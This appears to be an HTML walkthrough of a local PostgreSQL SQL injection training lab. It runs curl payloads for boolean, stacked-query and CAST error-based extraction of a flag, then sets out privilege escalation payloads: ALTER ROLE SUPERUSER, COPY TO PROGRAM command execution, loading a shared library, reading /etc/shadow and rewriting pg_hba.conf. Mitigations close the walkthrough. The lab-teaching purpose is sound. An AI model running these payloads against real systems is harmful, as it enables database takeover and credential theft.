<h4>Step 1: Explore the Admin Log Filter</h4>
<p>
    Start by testing the log filter with a known action type.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Baseline Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=LOGIN"<br><br>
        <span class="prompt">Response: </span>1 | LOGIN | Admin user logged in from 192.168.1.100 | 2026-03-23 10:45:08.354868
    </div>
</div>

<h4>Step 2: Confirm SQL Injection</h4>
<p>
    Test for injection by adding a boolean condition.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Injection Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=LOGIN' AND 1=1 -- -"<br>
        <span class="prompt">Response: </span>1 | LOGIN | Admin user logged in from 192.168.1.100 (TRUE condition)<br><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=LOGIN' AND 1=2 -- -"<br>
        <span class="prompt">Response: </span>No log entries found for that action type. (FALSE condition)
    </div>
</div>

<h4>Step 3: Verify Stacked Queries</h4>
<p>
    Since <code>pg_query()</code> supports stacked queries, confirm with a time delay.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Stacked Query Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>time curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action='; SELECT pg_sleep(2) -- -"<br><br>
        <span class="prompt">Response: </span>(2-second delay confirmed -- stacked queries work!)<br>
        real    0m2.045s
    </div>
</div>

<h4>Step 4: Error-Based Extraction with CAST</h4>
<p>
    Extract the secret from the restricted_data table.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. CAST Error Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=' AND 1=CAST((SELECT secret_value FROM restricted_data LIMIT 1) AS INTEGER) -- -"<br><br>
        <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_4lt3r_r0l3_pr1v3sc}"
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag from the error message and paste it into the verification form:
    <code>FLAG{pg_4lt3r_r0l3_pr1v3sc}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab14" \<br> --data-urlencode "action=' AND 1=CAST((SELECT secret_value FROM restricted_data LIMIT 1) AS INTEGER) -- -"<br><br>
        <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_4lt3r_r0l3_pr1v3sc}"
    </div>
</div>

<h4>Step 6: Understanding ALTER ROLE Privilege Escalation (Advanced Concept)</h4>
<p>
    In PostgreSQL, the <code>ALTER ROLE</code> command can modify user privileges.
    If the application's database user has the <code>CREATEROLE</code> privilege
    (or is a superuser), an attacker can escalate privileges via stacked queries.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. ALTER ROLE Escalation Chain (Conceptual)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Step A: Identify current user</span><br>
        <span class="prompt">Input: </span>' AND 1=CAST((SELECT current_user) AS INTEGER) -- -<br>
        <span class="prompt">Result: </span>ERROR: invalid input syntax for type integer: "sqli_arena"<br><br>
        <span class="prompt">// Step B: Check if user has superuser status</span><br>
        <span class="prompt">Input: </span>' AND 1=CAST((SELECT CASE WHEN usesuper THEN 'YES' ELSE 'NO' END FROM pg_user WHERE usename=current_user) AS INTEGER) -- -<br>
        <span class="prompt">Result: </span>ERROR: invalid input syntax for type integer: "NO"<br><br>
        <span class="prompt">// Step C: Escalate to superuser (requires CREATEROLE privilege)</span><br>
        <span class="prompt">Input: </span>'; ALTER ROLE sqli_arena SUPERUSER; -- -<br>
        <span class="prompt">Effect: </span>User now has superuser privileges<br><br>
        <span class="prompt">// Step D: Verify escalation</span><br>
        <span class="prompt">Input: </span>' AND 1=CAST((SELECT CASE WHEN usesuper THEN 'YES' ELSE 'NO' END FROM pg_user WHERE usename=current_user) AS INTEGER) -- -<br>
        <span class="prompt">Result: </span>ERROR: invalid input syntax for type integer: "YES"
    </div>
</div>

<h4>Step 7: Post-Escalation Capabilities</h4>
<p>
    Once superuser privileges are obtained, the attacker gains access to powerful
    PostgreSQL features:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Superuser Capabilities</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Execute OS commands via COPY TO PROGRAM</span><br>
        <span class="prompt">Input: </span>'; COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned.txt'; -- -<br><br>
        <span class="prompt">// Load arbitrary shared libraries</span><br>
        <span class="prompt">Input: </span>'; CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/evil.so','sys' LANGUAGE C; -- -<br><br>
        <span class="prompt">// Read any file on the filesystem</span><br>
        <span class="prompt">Input: </span>' UNION SELECT 1, pg_read_file('/etc/shadow'), '', NOW() -- -<br><br>
        <span class="prompt">// Grant superuser to other roles</span><br>
        <span class="prompt">Input: </span>'; ALTER ROLE postgres WITH PASSWORD 'hacked123'; -- -<br><br>
        <span class="prompt">// Install extensions</span><br>
        <span class="prompt">Input: </span>'; CREATE EXTENSION dblink; -- -
    </div>
</div>

<h4>Step 8: Other Privilege Escalation Vectors</h4>
<p>
    ALTER ROLE is not the only path to privilege escalation in PostgreSQL:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. Alternative Privesc Vectors</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// GRANT role membership</span><br>
        <span class="prompt">Input: </span>'; GRANT pg_execute_server_program TO sqli_arena; -- -<br>
        <span class="prompt">Effect: </span>Grants ability to execute server-side programs<br><br>
        <span class="prompt">// Predefined roles (PostgreSQL 14+)</span><br>
        <span class="prompt">Input: </span>'; GRANT pg_read_server_files TO sqli_arena; -- -<br>
        <span class="prompt">Input: </span>'; GRANT pg_write_server_files TO sqli_arena; -- -<br><br>
        <span class="prompt">// Modify pg_hba.conf via file write (if superuser)</span><br>
        <span class="prompt">Input: </span>'; COPY (SELECT 'host all all 0.0.0.0/0 trust') TO '/var/lib/postgresql/16/main/pg_hba.conf'; -- -<br>
        <span class="prompt">Input: </span>'; SELECT pg_reload_conf(); -- -<br>
        <span class="prompt">Effect: </span>Allows passwordless access from any IP
    </div>
</div>

<h4>Step 9: Detection and Prevention</h4>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 9. Mitigations</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">1. </span>Never grant CREATEROLE or SUPERUSER to application accounts<br>
        <span class="prompt">2. </span>Use parameterized queries / prepared statements<br>
        <span class="prompt">3. </span>Apply principle of least privilege to all database roles<br>
        <span class="prompt">4. </span>Monitor pg_authid and pg_roles for unexpected privilege changes<br>
        <span class="prompt">5. </span>Enable log_statement = 'ddl' to log ALTER/CREATE/DROP commands<br>
        <span class="prompt">6. </span>Use event triggers to alert on DDL changes<br>
        <span class="prompt">7. </span>Regularly audit role memberships with: SELECT * FROM pg_roles WHERE rolsuper;
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> PostgreSQL's <code>ALTER ROLE</code> command, combined with
    stacked query support in <code>pg_query()</code>, creates a serious privilege escalation
    vector. An attacker who can execute stacked queries may elevate from a low-privilege
    application account to a full superuser: unlocking COPY TO PROGRAM, file read/write,
    and extension installation. Defense: never grant <code>CREATEROLE</code> to application
    accounts, use prepared statements, enable DDL logging, and implement event triggers to
    detect unauthorized role modifications.
</div>
